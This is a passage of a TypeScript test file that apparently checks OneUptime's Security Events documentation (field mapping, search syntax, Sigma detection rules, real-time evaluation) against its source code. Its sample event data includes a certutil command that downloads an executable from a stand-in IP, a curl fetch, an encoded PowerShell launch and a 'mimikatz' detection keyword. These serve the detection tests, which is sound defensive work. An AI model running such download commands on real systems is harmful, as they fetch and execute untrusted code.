        inOrder: true,
      });
    }
  });

  it("reads each listed name, and the earlier of two, as the page says", () => {
    const rows: Array<Array<string>> = rowsOf(page, "Generic JSON fields");
    const values: Record<string, [string, string]> = {
      message: ["first message", "second message"],
      severityName: ["critical", "low"],
      time: ["2026-08-21T10:00:00Z", "2026-08-22T11:00:00Z"],
      principalUser: ["alice", "bob"],
      principalHost: ["web-01", "web-02"],
      principalIp: ["203.0.113.7", "198.51.100.9"],
      targetIp: ["192.0.2.1", "192.0.2.2"],
      className: ["ssh_login", "file_access"],
      ruleName: ["rule one", "rule two"],
      productName: ["Falco", "auditd"],
      processName: ["powershell.exe", "cmd.exe"],
      processPath: ["C:\\Windows\\System32\\certutil.exe", "/usr/bin/curl"],
      processCommandLine: [
        "certutil -urlcache -f http://203.0.113.7/a.exe",
        "curl -s https://get.example/x",
      ],
      parentProcessName: ["winword.exe", "bash"],
      parentProcessPath: ["C:\\Windows\\explorer.exe", "/usr/bin/bash"],
      parentProcessCommandLine: ["explorer.exe", "bash -c x"],
    };

    function read(field: string, event: NormalizedSecurityEvent): string {
      const value: unknown = (event as unknown as JSONObject)[field];

      return value instanceof Date ? value.toISOString() : String(value);
    }

    function expectedOf(field: string, raw: string): string {
      if (field === "time") {
        return new Date(raw).toISOString();
      }

      if (field === "severityName") {
        return normalizeOcsfSeverity(raw) as string;
      }

      if (field === "className") {
        // A free-form event type is title-cased: ssh_login -> Ssh Login.
        return raw
          .split("_")
          .map((word: string): string => {
            return word.charAt(0).toUpperCase() + word.slice(1);
          })
          .join(" ");
      }

      return raw;
    }

    for (const row of rows) {
      const field: string = codeSpans(row[0] as string)[0] as string;
      const listed: Array<string> = codeSpans(row[1] as string);
      const [first, second] = values[field] as [string, string];

      for (const name of listed) {
        expect({
          field,
          name,
          read: read(field, GenericNormalizer.normalize({ [name]: first })),
        }).toEqual({ field, name, read: expectedOf(field, first) });
      }

      for (let index: number = 1; index < listed.length; index++) {
        const earlier: string = listed[index - 1] as string;
        const later: string = listed[index] as string;

        expect({
          field,
          earlier,
          later,
          read: read(
            field,
            GenericNormalizer.normalize({ [later]: second, [earlier]: first }),
          ),
        }).toEqual({ field, earlier, later, read: expectedOf(field, first) });
      }
    }
  });

  it("maps the severity words it names onto the OCSF levels it names", () => {
    const expected: Record<string, OcsfSeverity> = {
      info: OcsfSeverity.Informational,
      warning: OcsfSeverity.Low,
      error: OcsfSeverity.Medium,
      alert: OcsfSeverity.Critical,
      emergency: OcsfSeverity.Fatal,
    };

    for (const [word, level] of Object.entries(expected)) {
      expect({ word, level: normalizeOcsfSeverity(word) }).toEqual({
        word,
        level,
      });
      expect(page).toContain(
        `\`${word}\` ${word === "info" ? "reads as" : "as"} ${level}`,
      );
    }
  });

  it("forwards Fluent Bit to the ingest route, dated by the first time field a generic event is read from", () => {
    const settings: Array<[string, string]> = codeBlockTitled(
      page,
      "fluent-bit.conf",
    )
      .split(LINE_BREAK)
      .slice(1)
      .filter((line: string): boolean => {
        return line.trim().length > 0;
      })
      .map((line: string): [string, string] => {
        const [key, ...rest] = line.trim().split(WHITESPACE);

        return [key as string, rest.join(" ")];
      });
    const valueOf: (key: string) => Array<string> = (
      key: string,
    ): Array<string> => {
      return settings
        .filter((setting: [string, string]): boolean => {
          return setting[0] === key;
        })
        .map((setting: [string, string]): string => {
          return setting[1];
        });
    };
    const timeFields: Array<string> =
      stringArrays(source("genericNormalizer")).get("TIME_FIELDS") || [];

    expect(valueOf("Name")).toEqual(["http"]);
    expect(valueOf("URI")).toEqual(["/security-events/v1/ingest"]);
    expect(valueOf("Format")).toEqual(["json"]);
    expect(valueOf("Json_date_key")).toEqual([timeFields[0]]);
    expect(valueOf("Header")).toEqual([
      "x-oneuptime-token YOUR_INGESTION_TOKEN",
      "x-oneuptime-service-name my-security-source",
    ]);
  });

  it("lists every security product a connection can poll, each with its setup guide", () => {
    const rows: Array<Array<string>> = rowsOf(
      page,
      "Connect a security product",
    );

    expect(rows.length).toBe(SecurityEventConnectorCatalog.length);

    for (const connector of SecurityEventConnectorCatalog as Array<SecurityEventConnectorDefinition>) {
      const row: Array<string> | undefined = rows.find(
        (cells: Array<string>): boolean => {
          return (cells[0] as string).startsWith(connector.title);
        },
      );

      expect({ connector: connector.title, listed: row !== undefined }).toEqual(
        {
          connector: connector.title,
          listed: true,
        },
      );
      expect(row?.[2]).toBe(`[${connector.title}](${connector.docsPath})`);

      // "Alerts, as Detection Findings": the class the connector says it imports.
      const importedAs: RegExpMatchArray | null = (row?.[1] as string).match(
        IMPORTED_AS,
      );

      if (importedAs) {
        expect({
          connector: connector.title,
          imports: connector.description.endsWith(
            `as ${importedAs[1]} Finding events.`,
          ),
        }).toEqual({ connector: connector.title, imports: true });
      }
    }
  });

  it("says a new connection's first poll looks back 24 hours", () => {
    expect(flat(source("connectionPoller"))).toContain(
      "export const DEFAULT_INITIAL_LOOKBACK_IN_MINUTES: number = 24 * 60;",
    );
    expect(page).toContain(
      "- The first poll looks back 24 hours, so a new connection shows recent records at once.",
    );
  });

  it("names a connection's row actions, Test connection and Run now", () => {
    const table: string = source("connectionsTable");

    expect(table).toContain('title: "Test connection",');
    expect(table).toContain('title: "Run now",');
    expect(page).toContain(
      "**Test connection**, in the connection's row, checks access to the product and that OneUptime's own workers are running, and imports nothing. **Run now** polls straight away.",
    );
  });

  it("names every typed field an event holds, and the severity levels it can take, as OCSF's", () => {
    const rows: Array<Array<string>> = rowsOf(page, "What an event holds");
    const named: Array<string> = rows.flatMap(
      (row: Array<string>): Array<string> => {
        return codeSpans(row[1] as string);
      },
    );
    const event: NormalizedSecurityEvent = GenericNormalizer.normalize({
      message: "m",
    });

    // The time and the attributes are named in words, not as fields.
    expect([...named, "time", "attributes"].sort()).toEqual(
      Object.keys(event).sort(),
    );
    expect(rowNamed(rows, "Severity")[1]).toBe(
      `\`severityName\`, one of ${Object.values(OcsfSeverity).slice(0, -1).join(", ")} or ${OcsfSeverity.Other}, and \`severityId\``,
    );
  });

  it("lists the search's short names as the search suggests them, each a typed field, and reads any other name as an attribute", () => {
    const named: Array<string> = codeSpans(
      lineStarting(page, "Search", "A field is either a short name"),
    );
    const shortNames: Array<string> = named.slice(
      0,
      SECURITY_EVENT_SEARCH_SUGGESTIONS.length,
    );

    expect(shortNames).toEqual([...SECURITY_EVENT_SEARCH_SUGGESTIONS]);
    expect(named.slice(SECURITY_EVENT_SEARCH_SUGGESTIONS.length)).toEqual([
      "severityName",
      "principalHost",
      "observable:<value>",
    ]);

    for (const name of [...shortNames, "severityName", "principalHost"]) {
      const filters: SecurityEventSearchFilters = parseSecurityEventSearch(
        `${name}:x`,
      );

      expect({
        name,
        typed: Object.keys(filters.fields).length,
        attributes: Object.keys(filters.attributes),
      }).toEqual({ name, typed: 1, attributes: [] });
    }

    expect(parseSecurityEventSearch("severityName:High").fields).toEqual({
      severityName: "High",
    });
    expect(parseSecurityEventSearch("zone:dmz").attributes).toEqual({
      zone: "dmz",
    });
    expect(
      parseSecurityEventSearch("observable:203.0.113.7").fields["observables"],
    ).toStrictEqual(new Search("203.0.113.7"));
  });

  it("does what the syntax table says for each of its examples", () => {
    const rows: Array<Array<string>> = rowsOf(page, "Search");
    const expected: Record<
      string,
      (filters: SecurityEventSearchFilters) => void
    > = {
      "failed logon": (filters: SecurityEventSearchFilters): void => {
        expect(filters).toEqual({
          freeText: "failed logon",
          fields: {},
          attributes: {},
        });
      },
      '"brute force"': (filters: SecurityEventSearchFilters): void => {
        expect(filters.freeText).toBe("brute force");
      },
      "severity:Critical": (filters: SecurityEventSearchFilters): void => {
        expect(filters.fields).toEqual({ severityName: "Critical" });
      },
      "@threat.matched:true": (filters: SecurityEventSearchFilters): void => {
        expect(filters.attributes).toEqual({ "threat.matched": "true" });
      },
      "-severity:Informational": (
        filters: SecurityEventSearchFilters,
      ): void => {
        expect(filters.fields["severityName"]).toStrictEqual(
          new NotEqual("Informational"),
        );
      },
      "severity:(High OR Critical)": (
        filters: SecurityEventSearchFilters,
      ): void => {
        expect(filters.fields["severityName"]).toStrictEqual(
          new Includes(["High", "Critical"]),
        );
      },
      "host:web-*": (filters: SecurityEventSearchFilters): void => {
        expect(filters.fields["principalHost"]).toBeInstanceOf(Wildcard);
      },
      "@threat.indicator_id:*": (filters: SecurityEventSearchFilters): void => {
        expect(filters.attributes["threat.indicator_id"]).toBeInstanceOf(
          NotNull,
        );
      },
      "@finding_info.title:~ransom": (
        filters: SecurityEventSearchFilters,
      ): void => {
        expect(filters.attributes["finding_info.title"]).toStrictEqual(
          new Search("ransom"),
        );
      },
    };
    const examples: Array<string> = rows.map((row: Array<string>): string => {
      return codeSpans(row[2] as string)[0] as string;
    });

    expect(examples).toEqual(Object.keys(expected));

    for (const example of examples) {
      (expected[example] as (filters: SecurityEventSearchFilters) => void)(
        parseSecurityEventSearch(example),
      );
    }
  });

  it("names the facets in the sidebar's order, and a value keeps or leaves out its events", () => {
    const titles: Array<string> = [...SECURITY_EVENT_FACETS]
      .sort(
        (
          a: SecurityEventFacetDefinition,
          b: SecurityEventFacetDefinition,
        ): number => {
          return a.priority - b.priority;
        },
      )
      .map((facet: SecurityEventFacetDefinition): string => {
        return facet.title;
      });
    const kept: Query<SecurityEvent> = applySecurityEventFacetFiltersToQuery({
      query: {},
      filters: new Map([["severityName", new Set(["High"])]]),
    });
    const leftOut: Query<SecurityEvent> = applySecurityEventFacetFiltersToQuery(
      {
        query: {},
        filters: new Map([
          [toSecurityEventExcludeFacetKey("severityName"), new Set(["Low"])],
        ]),
      },
    );

    expect(
      boldSpans(lineStarting(page, "Facets", "The sidebar counts")),
    ).toEqual(titles);
    expect((kept as JSONObject)["severityName"]).toBe("High");
    expect((leftOut as JSONObject)["severityName"]).toStrictEqual(
      new NotEqual("Low"),
    );
    expect(page).toContain(
      "Click a value to keep only its events, or the minus beside it to leave them out.",
    );
    /*
     * A second click takes the filter off: the shared facet row clears a
     * checked or excluded value, and its pressed minus clears an exclusion
     * (TelemetryFacetValueRow, pinned in Common's TelemetryFacetValueRow
     * and SecurityEventsViewer tests).
     */
    expect(page).toContain(
      "Click a value to keep only its events, or the minus beside it to leave them out. Click it again to undo.",
    );
    const row: string = flat(source("facetValueRow"));
    // The row: a click on a checked or excluded value clears it ...
    expect(row).toContain(
      "if (isFiltering) { props.onClear(props.value); return; }",
    );
    // ... and so does a click on the minus of an excluded one.
    expect(row).toContain(
      "if (isExcluded) { props.onClear(props.value); return; }",
    );
  });

  it("creates a rule in the form's two steps, with its fields and defaults", () => {
    const page_: string = flat(source("detectionRules"));
    // The page's fields, and the On Match step it draws from the shared one.
    const form: string = `${page_} ${flat(source("securityMatchFields"))}`;
    const steps: Array<string> = numberedSteps(page, "Create a rule");

    expect(page_).toContain(
      'formSteps={[ { title: "Sigma Rule", id: "sigma-rule" }, { title: "On Match", id: "on-match" }, ]}',
    );
    expect(page_).toContain(
      "...getSecurityMatchActionFields<DetectionRule>( DETECTION_RULE_MATCH_WORDING, ),",
    );
    // Each step of the page names a step of the form, or a fold.
    expect(
      [1, 3].map((index: number): string => {
        return boldSpans(steps[index] as string)[0] as string;
      }),
    ).toEqual(["Sigma Rule", "On Match"]);
    expect(boldSpans(steps[4] as string)[0]).toBe(
      SECURITY_MATCH_RAISES_FIELD_TITLE,
    );
    expect(boldSpans(steps[5] as string)[0]).toBe("More fields");
    expect(page_).toContain(
      "createInitialValues={{ isEnabled: true, evaluationIntervalInMinutes: 5,",
    );
    expect(page_).toContain(
      "shouldCreateCase: true, shouldCreateAlert: true, shouldWriteDetectionFinding: true, shouldCreateIncident: false, matchCountThreshold: 1, }}",
    );

    for (const title of [
      "Name",
      "Enabled",
      "Sigma Rule (YAML)",
      "Description",
      "Open a Case on Match",
      "Write Detection Finding on Match",
      "Alert Severity",
      "Incident Severity",
    ]) {
      expect(form).toContain(`title: "${title}",`);
      expect(boldSpans(steps.join("\n"))).toContain(title);
    }

    // The name follows the Sigma rule's title; Enabled is the Edit form's.
    expect(steps[2]).toContain("The **Name** fills in from the rule's `title`");
    expect(steps[2]).toContain("**Enabled** is on its edit form");
    expect(page_).toContain("getDetectionRuleNameAfterYamlChange(");

    const enabledField: string = page_.slice(
      page_.indexOf('title: "Enabled", stepId: "sigma-rule",'),
    );

    expect(
      enabledField.startsWith(
        'title: "Enabled", stepId: "sigma-rule", fieldType: FormFieldSchemaType.Toggle, required: false,',
      ),
    ).toBe(true);
    expect(enabledField.slice(0, enabledField.indexOf("},"))).toContain(
      "doNotShowWhenCreating: true,",
    );
    /*
     * "A new rule runs": the create sends no isEnabled, and the server
     * stores the column's default of on (issue #5158).
     */
    expect(new DetectionRule().isDefaultValueColumn("isEnabled")).toBe(true);
    expect(
      new DetectionRule().getTableColumnMetadata("isEnabled").defaultValue,
    ).toBe(true);

    expect(steps[3]).toContain("keep **Open a Case on Match** on");
    // What a match raises: the choice's answers, the default first.
    expect(
      SECURITY_MATCH_RAISES_ANSWERS.map(
        (answer: SecurityMatchRaises): string => {
          return SECURITY_MATCH_RAISES_COPY[answer].title;
        },
      ),
    ).toEqual(["Create an alert", "Declare an incident", "Both", "Neither"]);
    expect(steps[4]).toContain(
      "**Create an alert** (the default), **Declare an incident**, **Both** or **Neither**",
    );
    expect(
      getSecurityMatchRaises({
        shouldCreateAlert: true,
        shouldCreateIncident: false,
      }),
    ).toBe(SecurityMatchRaises.Alert);
    expect(steps[5]).toContain(
      "**Write Detection Finding on Match** (on), **Run in Real Time** (off) and how matches are counted",
    );
    // A new rule runs on its interval.
    expect(page_).toContain("isRealTime: false,");
    expect(form).toContain('title: "Run in Real Time",');
    // Detection Rules is a page of the Detections section, its first.
    expect(
      getSecurityEventsMenuSectionFor(PageMap.SECURITY_EVENTS_DETECTION_RULES)
        ?.title,
    ).toBe("Detections");
    expect(
      getSecurityEventsMenuSectionFor(PageMap.SECURITY_EVENTS_DETECTION_RULES)
        ?.items[0]?.title,
    ).toBe("Detection Rules");
    expect(page).toContain(
      "Open **Products → Security Events → Detections → Detection Rules** and click **Create Detection Rule**.",
    );
  });

  it("parses the page's first rule: its level, its ATT&CK tags and its selections, and compiles it", () => {
    const yaml: string = codeBlockTitled(page, "failed-logon-burst.yml");
    const rule: SigmaRule = SigmaRuleParser.parse(yaml);

    expect(rule.title).toBe("Failed logon burst");
    expect(rule.level).toBe(SigmaLevel.High);
    expect(
      rule.mitreTechniques.map((id: string): string => {
        return id.toUpperCase();
      }),
    ).toEqual(["T1110"]);
    expect(
      rule.mitreTactics.map((id: string): string => {
        return id.toUpperCase();
      }),
    ).toEqual(["TA0006"]);
    expect(
      rule.selections.map((selection: { name: string }): string => {
        return selection.name;
      }),
    ).toEqual(["selection", "filter_internal"]);
    // `principalIp|startswith: '10.'` keeps 10.x.x.x out.
    expect(boundValues(compiledSql(yaml))).toContain("10.%");
  });

  it("combines selections with the conditions it lists", () => {
    const words: Array<string> = codeSpans(
      lineStarting(page, "What a rule can say", "- Conditions combine"),
    );
    const detection: string =
      "detection:\n  selection_logon:\n    className: Authentication\n  selection_admin:\n    principalUser: admin\n  filter_internal:\n    principalIp|startswith: '10.'\n";
    const conditions: Array<string> = [
      "selection_logon and selection_admin",
      "selection_logon or selection_admin",
      "selection_logon and not filter_internal",
      "(selection_logon or selection_admin) and not filter_internal",
      ...words.slice(3),
    ];

    expect(words.slice(0, 3)).toEqual(["and", "or", "not"]);
    expect(words.slice(3)).toEqual([
      "1 of selection_*",
      "all of selection_*",
      "any of them",
      "all of them",
    ]);

    for (const condition of conditions) {
      expect(() => {
        return compiledSql(`title: t\n${detection}  condition: ${condition}\n`);
      }).not.toThrow();
    }
  });

  it("matches a field map on every field and any listed value, and a keyword list in the message", () => {
    const map: string = compiledSql(
      sigmaRule(
        "    className: Authentication\n    statusName:\n      - Failure\n      - Blocked",
      ),
    ).query;
    const keywords: Statement = compiledSql(
      "title: t\ndetection:\n  keywords:\n    - mimikatz\n  condition: keywords\n",
    );

    expect(map).toContain("className");
    expect(map).toContain(" AND ");
    expect(map).toContain(" OR ");
    expect(keywords.query).toContain("message ILIKE");
    expect(boundValues(keywords)).toContain("%mimikatz%");
    expect(page).toContain(
      "- Selections are field maps (every field must match; a list of values matches any of them) or keyword lists, which match anywhere in the message.",
    );
  });

  it("lists exactly the field modifiers the parser accepts, and each one compiles", () => {
    const named: Array<string> = codeSpans(
      lineStarting(page, "What a rule can say", "- Field modifiers:"),
    );
    const uses: Record<string, string> = {
      contains: "    principalUser|contains: adm",
      startswith: "    principalUser|startswith: adm",
      endswith: "    principalUser|endswith: adm",
      all: "    principalUser|contains|all:\n      - adm\n      - in",
      re: "    principalUser|re: '^adm.*'",
      cased: "    principalUser|cased: Admin",
      gt: "    targetPort|gt: 1024",
      gte: "    targetPort|gte: 1024",
      lt: "    targetPort|lt: 1024",
      lte: "    targetPort|lte: 1024",
      cidr: "    principalIp|cidr: 10.0.0.0/8",
      exists: "    principalHost|exists: true",
      windash: "    principalProcess|windash|contains: ' -enc '",
      expand: "    principalUser|expand: '%admins%'",
    };

    expect(named.slice(0, SIGMA_SUPPORTED_MODIFIERS.length)).toEqual([
      ...SIGMA_SUPPORTED_MODIFIERS,
    ]);
    expect(Object.keys(uses)).toEqual([...SIGMA_SUPPORTED_MODIFIERS]);

    for (const modifier of SIGMA_SUPPORTED_MODIFIERS) {
      expect(() => {
        return compiledSqlAsSaved(sigmaRule(uses[modifier] as string));
      }).not.toThrow();
    }

    // expand reads the list the project keeps: its values as written, and its patterns.
    expect(boundValues(compiledSqlAsSaved(sigmaRule(uses["expand"]!)))).toEqual(
      expect.arrayContaining([["adm"], "adm%"]),
    );

    // windash matches the flag in both spellings.
    expect(boundValues(compiledSql(sigmaRule(uses["windash"]!)))).toEqual(
      expect.arrayContaining(["% -enc %", "% /enc %"]),
    );
  });

  it("compares text ignoring case unless the rule adds cased, and a plain value against the whole field", () => {
    // A plain value: the whole field, compared lowercased.
    const plain: Statement = compiledSql(sigmaRule("    principalUser: ADM"));
    const plainCased: Statement = compiledSql(
      sigmaRule("    principalUser|cased: ADM"),
    );
    const contains: Statement = compiledSql(
      sigmaRule("    principalUser|contains: ADM"),
    );
    const containsCased: Statement = compiledSql(
      sigmaRule("    principalUser|contains|cased: ADM"),
    );
    const wildcard: Statement = compiledSql(
      sigmaRule("    principalUser: adm*"),
    );

    expect(plain.query).toContain("lowerUTF8(principalUser) = ");
    expect(boundValues(plain)).toEqual(["adm"]);
    expect(plainCased.query).not.toContain("lowerUTF8");
    expect(boundValues(plainCased)).toEqual(["ADM"]);
    expect(contains.query).toContain(" ILIKE ");
    expect(containsCased.query).toContain(" LIKE ");
    expect(containsCased.query).not.toContain("ILIKE");
    expect(boundValues(contains)).toEqual(["%ADM%"]);
    expect(boundValues(wildcard)).toEqual(["adm%"]);
    expect(page).toContain(
      "Text is compared ignoring case, unless you add `cased`.",
    );
    expect(page).toContain(
      "a plain value must equal the whole field, so use `contains` or `*` for part of one.",
    );
  });

  it("reads a field as a typed field, a common Sigma spelling of one, or an attribute key spelled as in the event", () => {
    expect(resolveSigmaField("principalUser")).toEqual({
      kind: "textColumn",
      column: "principalUser",
    });
    expect(resolveSigmaField("CommandLine")).toEqual({
      kind: "textColumn",
      column: "processCommandLine",
    });
    expect(resolveSigmaField("src_ip")).toEqual({
      kind: "textColumn",
      column: "principalIp",
    });
    expect(resolveSigmaField("Hostname")).toEqual({
      kind: "textColumn",
      column: "principalHost",
    });
    expect(resolveSigmaField("threat.matched")).toEqual({
      kind: "attribute",
      attributeKey: "threat.matched",
    });
    expect(page).toContain(
      "- A field is a typed field (`principalUser`), a common Sigma spelling of one (`CommandLine`, `src_ip`, `Hostname`), or any attribute key, spelled as it is in the event (`threat.matched`).",
    );
    expect(page).toContain(
      "An attribute is named as it is in the event (`threat.matched`, not `attributes.threat.matched`).",
    );
  });

  it("reads Image, CommandLine, ParentImage and ParentCommandLine as the process an event is about and its parent, never as principalProcess", () => {
    const line: string = lineStarting(
      page,
      "What a rule can say",
      "- `Image` and `CommandLine`",
    );
    const named: Array<string> = codeSpans(line);

    expect(named).toEqual([
      "Image",
      "CommandLine",
      "processPath",
      "processCommandLine",
      "ParentImage",
      "ParentCommandLine",
      "parentProcessPath",
      "parentProcessCommandLine",
      "principalProcess",
    ]);

    // Each Sigma name reads the column the page pairs it with.
    for (const [field, column] of [
      ["Image", "processPath"],
      ["CommandLine", "processCommandLine"],
      ["ParentImage", "parentProcessPath"],
      ["ParentCommandLine", "parentProcessCommandLine"],
    ]) {
      expect({ field, resolved: resolveSigmaField(field as string) }).toEqual({
        field,
        resolved: { kind: "textColumn", column },
      });
    }

    // In a launch the actor is the parent: OCSF's actor.process.
    const launch: NormalizedSecurityEvent = OcsfNormalizer.normalize({
      class_uid: 1007,
      activity_id: 1,
      actor: { process: { name: "winword.exe", cmd_line: "winword.exe" } },
      process: {
        name: "powershell.exe",
        cmd_line: "powershell.exe -enc JAB",
        file: { path: "C:\\Windows\\powershell.exe" },
      },
    });

    expect(launch.principalProcess).toBe("winword.exe");
    expect(launch.parentProcessName).toBe("winword.exe");
    expect(launch.processCommandLine).toBe("powershell.exe -enc JAB");
    expect(page).toContain(
      "`principalProcess` is the process that acted, which in a launch is the parent.",
    );
  });

  it("sets the level as the parser and the finding do: medium when missing", () => {
    expect(SIGMA_DEFAULT_LEVEL).toBe(SigmaLevel.Medium);
    expect(
      SigmaRuleParser.parse(sigmaRule("    className: Authentication")).level,
    ).toBe(SigmaLevel.Medium);
    expect(Object.values(SigmaLevel)).toEqual([
      "informational",
      "low",
      "medium",
      "high",
      "critical",
    ]);
    expect(page).toContain(
      "- `level` sets the severity: `informational`, `low`, `medium`, `high` or `critical`, and `medium` when missing.",
    );
  });

  it("refuses an aggregation when the rule is saved, and lets logsource and timeframe narrow nothing", () => {
    const bare: Statement = compiledSql(
      sigmaRule("    className: Authentication"),
    );
    const withLogsource: Statement = compiledSql(
      `logsource:\n  product: windows\n  service: security\n${sigmaRule("    className: Authentication")}`,
    );
    const withTimeframe: Statement = compiledSql(
      sigmaRule("    className: Authentication").replace(
        "  condition: selection\n",
        "  timeframe: 5m\n  condition: selection\n",
      ),
    );

    expect(() => {
      return SigmaRuleParser.parse(
        sigmaRule("    className: Authentication").replace(
          "condition: selection",
          "condition: selection | count() by principalIp > 5",
        ),
      );
    }).toThrow("aggregation expressions");
    expect(page).toContain(
      "Aggregations such as `| count() by principalIp > 5` are refused when you save",
    );

    for (const statement of [withLogsource, withTimeframe]) {
      expect(statement.query).toBe(bare.query);
      expect(boundValues(statement)).toEqual(boundValues(bare));
    }

    expect(page).toContain(
      "`logsource` is informational only and narrows nothing: put that filter in a selection, such as `className: Authentication`. A `timeframe` is ignored, because the rule's interval sets its window.",
    );
  });

  it("states the evaluation ranges and the new rule's interval as the form and the server hold them", () => {
    const rows: Array<Array<string>> = rowsOf(page, "Evaluation settings");

    expect(DETECTION_EVALUATION_INTERVAL_MIN_IN_MINUTES).toBe(1);
    expect(DETECTION_EVALUATION_INTERVAL_MAX_IN_MINUTES).toBe(1440);
    expect(rowNamed(rows, "**Evaluation Interval (Minutes)**")[1]).toBe(
      "How often the rule runs: whole minutes, 1 to 1440. A new rule's form starts at 5.",
    );
    expect(DETECTION_MATCH_COUNT_THRESHOLD_MIN).toBe(1);
    expect(DETECTION_MATCH_COUNT_THRESHOLD_MAX).toBe(1000000);
    expect(rowNamed(rows, "**Match Count Threshold**")[1]).toContain(
      "1 to 1000000, and 1 fires on any match.",
    );
    expect(firstCells(rows)).toEqual([
      "**Evaluation Interval (Minutes)**",
      "**Run in Real Time**",
      "**Group By Field**",
      "**Distinct Count Field**",
      "**Match Count Threshold**",
    ]);
  });

  it("says which rules can run in real time, how many a project runs, what the list shows, and how a rule hands over", () => {
    const realTime: string = flat(section(page, "Real-time rules"));
    const rules: string = flat(source("detectionRules"));
    const jobs: string = flat(source("realTimeJobs"));
    const service: string = flat(source("detectionRuleService"));

    // What fits: one event, threshold 1, no distinct count, no `re`, no correlation.
    for (const problem of [
      REAL_TIME_THRESHOLD_PROBLEM,
      REAL_TIME_DISTINCT_COUNT_PROBLEM,
      REAL_TIME_REGULAR_EXPRESSION_PROBLEM,
      REAL_TIME_CORRELATION_PROBLEM,
    ]) {
      expect(problem.length).toBeGreaterThan(20);
    }

    expect(REAL_TIME_THRESHOLD_PROBLEM).toContain("Match Count Threshold to 1");
    expect(REAL_TIME_DISTINCT_COUNT_PROBLEM).toContain("Distinct Count Field");
    expect(REAL_TIME_REGULAR_EXPRESSION_PROBLEM).toContain(
      "contains, startswith or endswith",
    );
    expect(realTime).toContain(
      "- It fits a rule with a **Match Count Threshold** of 1, no **Distinct Count Field** and no `re` modifier. A correlation counts events together, so it runs on its interval.",
    );
    expect(realTime).toContain(
      "turn on **Run in Real Time**, under **More fields** on the **On Match** step.",
    );
    expect(rules).toContain('title: "Run in Real Time", stepId: "on-match",');

    expect(DETECTION_REAL_TIME_RULES_MAX).toBe(50);
    expect(realTime).toContain(
      `- A project runs at most ${DETECTION_REAL_TIME_RULES_MAX} rules in real time,`,
    );

    // Its Status, and its interval column, say Real time.
    expect(DETECTION_RULE_REAL_TIME.text).toBe("Real time");
    expect(realTime).toContain(
      `a real-time rule's **Status** says **${DETECTION_RULE_REAL_TIME.text}**, and so does its interval column.`,
    );
    expect(rules).toContain('translator.translateText("Real time")');

    // On: a handover from the last run; off: back on the interval two minutes behind.
    expect(jobs).toContain("getRealTimeHandoverWindow");
    expect(service).toContain("RealTimeJobs.enqueueHandover(");
    expect(service).toContain(
      "const resumeFrom: Date = OneUptimeDate.addRemoveSeconds( OneUptimeDate.getCurrentDate(), -DETECTION_EVALUATION_DELAY_IN_SECONDS, );",
    );
    expect(DETECTION_EVALUATION_DELAY_IN_SECONDS).toBe(120);
    expect(realTime).toContain(
      "- Turned on, the rule first reads what arrived since its last run, so nothing falls between its schedule and real time. Turned off, it goes back to its interval, from two minutes before.",
    );

    // Every source's write is screened.
    expect(flat(source("ingestService"))).toContain(
      "RealTimeDetections.screen(",
    );
    expect(flat(source("connectionPoller"))).toContain(
      "RealTimeDetections.screen(",
    );
    expect(realTime).toContain(
      "Every event OneUptime receives, from every source, is then checked against the rule as it arrives",
    );
  });

  it("groups and counts on the typed fields its goals name, and leaves empty values out of a distinct count", () => {
    const goals: Array<Array<string>> = rowsOf(page, "Evaluation settings", 1);
    const fields: Array<string> = goals.flatMap(
      (row: Array<string>): Array<string> => {
        return [...codeSpans(row[1] as string), ...codeSpans(row[2] as string)];
      },
    );

    expect([...new Set(fields)].sort()).toEqual([
      "principalHost",
      "principalIp",
      "principalUser",
      "targetPort",
    ]);

    for (const field of fields) {
      expect({ field, kind: resolveSigmaField(field).kind }).not.toEqual({
        field,
        kind: "attribute",
      });
    }

    expect(buildSigmaFieldExpression("principalHost").query).toBe(
      "principalHost",
    );
    expect(buildSigmaDistinctCountExpression("targetPort").query).toBe(
      "toString(nullIf(targetPort, 0))",
    );
    expect(flat(source("securityEventService"))).toContain(
      'statement.append("uniqExact(nullIf("); statement.append(data.distinctCountExpression); statement.append(", \'\'))");',
    );
  });

  it("runs the rules every minute over back-to-back windows, at most 24 hours back, recording every group and opening cases for the 100 highest", () => {
    const job: string = source("detectionJob");
    const evaluator: string = flat(source("detectionEvaluator"));
    const service: string = flat(source("securityEventService"));

    expect(job).toContain("schedule: EVERY_MINUTE,");
    expect(job).toContain(
      "DetectionRuleEvaluator.enqueueProjectsWithDueRules()",
    );
    expect(job).toContain(
      "DetectionRuleEvaluator.evaluateDueRulesForProject(projectId, lease)",
    );
    expect(evaluator).toContain(
      "let startTime: Date = rule.lastEvaluatedAt ? rule.lastEvaluatedAt : OneUptimeDate.addRemoveMinutes(endTime, -intervalInMinutes); if (OneUptimeDate.isBefore(startTime, earliestAllowed)) { startTime = earliestAllowed; }",
    );
    expect(evaluator).toContain(
      "maxGroups: DETECTION_MAX_FINDINGS_PER_EVALUATION + 1,",
    );
    expect(evaluator).toContain(
      "openLimit: DETECTION_MAX_GROUPS_PER_EVALUATION, recordLimit: DETECTION_MAX_FINDINGS_PER_EVALUATION,",
    );
    expect(service).toContain(
      "AND time >= ${{ type: TableColumnType.DateTime64, value: data.startTime, }} AND time < ${{ type: TableColumnType.DateTime64, value: data.endTime, }}",
    );
    expect(service).toContain(
      "statement.append(` ORDER BY ${effectiveCountColumn} DESC LIMIT `);",
    );
    expect(DETECTION_MAX_LOOKBACK_IN_MINUTES).toBe(24 * 60);
    expect(DETECTION_MAX_GROUPS_PER_EVALUATION).toBe(100);
    expect(DETECTION_MAX_FINDINGS_PER_EVALUATION).toBe(10000);
    expect(page).toContain(
      "OneUptime checks every minute for enabled rules whose interval has passed since their last run.",
    );
    // Each run stops two minutes short of now, for events still on their way.
    expect(DETECTION_EVALUATION_DELAY_IN_SECONDS).toBe(2 * 60);
    expect(evaluator).toContain("DETECTION_EVALUATION_DELAY_IN_SECONDS");
    expect(page).toContain(
      "Each run reads the events whose event time falls between the previous run and two minutes ago, then moves on.",
    );
    expect(page).toContain(
      "- An event that arrives more than two minutes late, once a run has covered its time, is stored and searchable, but that rule never reads it.",
    );
    expect(page).toContain(
      "the next run covers the whole gap, up to the last 24 hours.",
    );
    expect(page).toContain(
      "- Every group that reaches the threshold becomes a Detection Finding, up to 10,000 a run. Alerts, incidents and cases open for the 100 with the highest counts; the rest share one case about the rule, and the rule's **Last Error** says how many groups matched.",
    );
  });

  it("picks the alert's severity in the order the engine does", () => {
    const alerting: string = flat(source("alerting"));
    const picker: string = alerting.slice(
      alerting.indexOf("export function pickSeverityByPrecedence"),
    );
    const explicitAt: number = picker.indexOf("if (explicitSeverityId) {");
